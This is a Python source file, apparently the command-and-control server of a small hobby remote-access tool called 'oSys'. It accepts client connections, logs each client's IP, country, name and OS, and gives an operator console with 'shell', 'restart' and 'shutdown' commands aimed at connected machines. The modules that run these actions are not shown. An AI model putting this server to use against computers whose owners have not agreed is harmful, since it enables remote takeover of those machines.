import socket
import threading
from server_folder.tools import Menu  # Delete when GUI is added
import server_folder.config as config
from server_folder.Modules import shell as Shell, power as Power


class Server:
    def __init__(self, ip, port):
        """
        Initiates the server
        :param ip: ip address to host the server on
        :param port: port to listen for connections on
        """
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((ip, port))
        self.server_socket.listen()
        print('Listening for clients...')
        self.client_sockets = []
        self.messages = []

    def close(self):
        """ Closes the server """
        self.server_socket.close()

    def send(self, sock, message):
        """
        Sends a message in small chunks to the client
        :param sock: Client socket object
        :param message: Message to send to the server (bytes/str)
        """
        message = message.encode() if type(message) != bytes else message
        if len(message) % config.BUFFER_SIZE == 0:
            message = message + '.'.encode()
        while message:
            sock.send(message[:config.BUFFER_SIZE])
            message = message[config.BUFFER_SIZE:]

    def receive(self, sock, as_bytes=False):
        """
        Recieve a message in small chunks from the client
        :param sock: Client socket object
        :param as_bytes: If set to True, this function will return the data as bytes. Default=False
        """
        chunk = sock.recv(config.BUFFER_SIZE)
        data = chunk
        while len(chunk) == config.BUFFER_SIZE:
            chunk = sock.recv(config.BUFFER_SIZE)
            if chunk != '.'.encode():
                data += chunk
        return data if as_bytes else data.decode()


def print_logo():
    print('          ____                \n'
          '   ___   / ___|   _   _   ___ \n'
          '  / _ \  \___ \  | | | | / __|\n'
          ' | (_) |  ___) | | |_| | \__ \\\n'
          '  \___/  |____/   \__, | |___/\n'
          '                  |___/       \n'
          'Made by: Asaf and Rohy\n\nEnter your command:')


def client_connections(server):
    """
    Handles new connections and adds them to the client list.
    :param server: Server socket object
    """
    try:
        while True:
            (client_socket, addr) = server.server_socket.accept()
            print('\n[+] New connection from: ', addr[0])
            client_data = server.receive(client_socket).split(',')  # IP,CountryCode,Name,Os
            print({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})

            # Add new client to the clients list
            exist = False
            for client in config.all_connections:
                if client['ip'] == addr[0]:
                    exist = True
                    break
            if not exist:
                config.all_connections.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
    except socket.error:
        client_connections(server)


def get_targets():
    """Wip would be connected to the GUI"""
    return [0]


def main():
    print_logo()
    server = Server('localhost', 8000)
    menu = Menu(server)  # Delete after GUI
    threading.Thread(target=client_connections, args=(server,)).start()  # Thread to accept new connections
    while True:
        user_input = input(config.custom_console).split()
        cmd = user_input[0] if len(user_input) > 0 else ''  # Get raw command
        args = user_input[1] if len(user_input) > 1 else ''  # Get raw argument

        try:
            if cmd == 'menu' or cmd.lower() == 'help':
                menu.help()
            elif cmd == 'list':
                menu.refresh_client_list()
            elif cmd == 'select':
                menu.select(int(args))
            elif cmd == 'quit':
                menu.quit()
            elif cmd == 'kill':
                menu.kill()
            # -------------------------
            elif cmd == 'shell':
                Shell.shell(server, get_targets())
            elif cmd == 'restart':
                Power.restart(server, get_targets())
            elif cmd == 'shutdown':
                Power.shutdown(server, get_targets())
            elif cmd == '':
                print('\n')
            else:
                print('[!] Invalid command.\n')
        except Exception as e:
            print(e)


if __name__ == "__main__":
    main()
